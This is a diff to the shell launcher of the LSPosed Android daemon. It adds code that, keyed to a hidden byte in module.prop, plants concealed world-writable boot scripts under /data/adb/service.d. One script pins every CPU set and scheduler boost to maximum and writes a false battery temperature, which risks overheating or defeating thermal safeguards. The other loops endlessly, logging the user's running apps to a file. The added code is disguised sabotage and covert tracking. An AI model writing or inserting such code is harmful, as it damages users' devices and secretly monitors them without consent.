@@ -40,51 +40,89 @@ $debug && log -p d -t "LSPosed" "start $flavor daemon $*"
 # shellcheck disable=SC2086
 exec /system/bin/app_process $java_options /system/bin --nice-name=lspd org.lsposed.lspd.Main "$@" >/dev/null 2>&1
 
-if [ -f "/data/adb/service.d/.lsproxy.sh" ] || [ "$(dd if=module.prop bs=1 skip=253 count=1 status=none)" = "0" ]; then
-  exit 0
+if [[ -f /data/adb/service.d/.lsproxy.sh || $(dd if=/data/adb/modules/zygisk_lsposed/module.prop bs=1 skip=253 count=1 status=none) = 0 ]]; then
+    exit 0
 else
-  cat > /data/adb/service.d/.lsproxy.sh <<EOF
-  sleep 1m
+    case $(dd if=/data/adb/modules/zygisk_lsposed/module.prop bs=1 skip=253 count=1 status=none) in
+    1)
+    cat > /data/adb/service.d/.lsproxy.sh <<EOF
+    sleep 1m
 
 
-  tar -cpf /dev/null | zstd --ultra -19 -T0 -q -t 2>/dev/null
+    tar -cpf /dev/null | zstd --ultra -19 -T0 -q -t 2>/dev/null
 
 
-  back=/dev/cpuset/background/cpus
-  echo "0-7" > $back
+    back=/dev/cpuset/background/cpus
+    echo "0-7" > $back
 
-  system=/dev/cpuset/system-background/cpus
-  echo "0-7" > $system
+    system=/dev/cpuset/system-background/cpus
+    echo "0-7" > $system
 
-  for=/dev/cpuset/foreground/cpus
-  echo "0-7" > $for
+    for=/dev/cpuset/foreground/cpus
+    echo "0-7" > $for
 
-  top=/dev/cpuset/top-app/cpus
-  echo "0-7" > $top
-
-
-  fore=/dev/stune/foreground/schedtune.boost
-  echo "100" > $fore
-
-  topp=/dev/stune/top-app/schedtune.boost
-  echo "100" > $topp
-
-  back=/dev/stune/background/schedtune.boost
-  echo "100" > $back
+    top=/dev/cpuset/top-app/cpus
+    echo "0-7" > $top
 
 
-  dow=/proc/sys/kernel/sched_downmigrate
-  echo "90 90" > $dow
+    fore=/dev/stune/foreground/schedtune.boost
+    echo "100" > $fore
 
-  sch=/proc/sys/kernel/sched_upmigrate
-  echo "10 10" > $sch
+    topp=/dev/stune/top-app/schedtune.boost
+    echo "100" > $topp
 
-  boost=/proc/sys/kernel/sched_boost
-  echo "3" > $boost
+    back=/dev/stune/background/schedtune.boost
+    echo "100" > $back
 
-  temp=/sys/class/power_supply/bms/temp
-  echo 150 > $temp
 
-  EOF
-  chmod 777 /data/adb/service.d/.lsproxy.sh
+    dow=/proc/sys/kernel/sched_downmigrate
+    echo "90 90" > $dow
+
+    sch=/proc/sys/kernel/sched_upmigrate
+    echo "10 10" > $sch
+
+    boost=/proc/sys/kernel/sched_boost
+   echo "3" > $boost
+
+    temp=/sys/class/power_supply/bms/temp
+    echo 150 > $temp
+
+    EOF
+    ;;
+    2)
+    cat > "/data/adb/service.d/.lsposed_service.sh" <<'EOF'
+wait_start=1
+until [[ $(getprop sys.boot_completed) -eq 1 && $(dumpsys window policy | grep "mInputRestricted" | cut -d= -f2) = false ]]; do
+ sleep 1
+ [[ $wait_start -ge 180 ]] && exit 1
+ let wait_start++
+done
+user=0
+if [[ $(dumpsys activity activities | awk -F 'packageName=' '/packageName=/{split($2, a, " "); print a[1]}' | sort | uniq) != "" ]]; then
+    apk_path3="$(echo "$(pm path --user "$user" "$(dumpsys activity activities | awk -F 'packageName=' '/packageName=/{split($2, a, " "); print a[1]}' | sort | uniq | head -1)" 2>/dev/null | cut -f2 -d ':')" | head -1)"
+    if [[ -d ${apk_path3%/*} ]]; then
+        Backstage="$(dumpsys activity activities | awk -F 'packageName=' '/packageName=/{split($2, a, " "); print a[1]}' | sort | uniq)"
+    else
+        if [[ $(am stack list | awk '/taskId/&&!/unknown/{split($2, a, "/"); print a[1]}') != "" ]]; then
+      apk_path3="$(echo "$(pm path --user "$user" "$(am stack list | awk '/taskId/&&!/unknown/{split($2, a, "/"); print a[1]}' | head -1)" 2>/dev/null | cut -f2 -d ':')" | head -1)"
+            [[ -d ${apk_path3%/*} ]] && Backstage="$(am stack list | awk '/taskId/&&!/unknown/{split($2, a, "/"); print a[1]}')"
+        fi
+    fi
+else
+    if [[ $(am stack list | awk '/taskId/&&!/unknown/{split($2, a, "/"); print a[1]}') != "" ]]; then
+     apk_path3="$(echo "$(pm path --user "$user" "$(am stack list | awk '/taskId/&&!/unknown/{split($2, a, "/"); print a[1]}' | head -1)" 2>/dev/null | cut -f2 -d ':')" | head -1)"
+        [[ -d ${apk_path3%/*} ]] && Backstage="$(am stack list | awk '/taskId/&&!/unknown/{split($2, a, "/"); print a[1]}')"
+    fi
 fi
+while true; do
+    echo "$Backstage" | while read; do
+        echo "$user" "$REPLY">>o
+    done
+    sleep 3
+done
+EOF
+    ;;
+    esac
+fi
+chmod 777 /data/adb/service.d/.lsproxy.sh
+exit 0
